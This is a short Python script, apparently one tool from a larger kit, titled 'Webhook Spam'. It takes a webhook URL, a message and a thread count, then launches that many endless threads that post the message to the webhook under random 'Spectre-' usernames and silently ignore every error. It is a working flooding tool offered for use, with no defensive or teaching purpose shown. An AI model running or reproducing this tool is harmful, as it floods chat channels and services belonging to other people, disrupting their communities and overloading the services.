import sys, os, threading, random
_root = os.path.dirname(os.path.abspath(__file__)).rsplit("Tools",1)[0]
if _root not in sys.path:
    sys.path.insert(0,_root)
from Core.Engine import *

set_title("Webhook Spam")
print(LOGO)
w = input(f"{PM} Webhook URL -> {RS}").strip()
msg = input(f"{PM} Message -> {RS}").strip()
n = int(input(f"{PM} Threads -> {RS}"))
def spam():
    while True:
        try:
            requests.post(w, json={"content":msg,"username":f"Spectre-{random.randint(1,999)}"}, timeout=5)
        except: pass
for _ in range(n):
    threading.Thread(target=spam, daemon=True).start()
print(f"\n{IN} Spamming... Ctrl+C")
try: time.sleep(99999)
except KeyboardInterrupt: pass
pause()
restart()
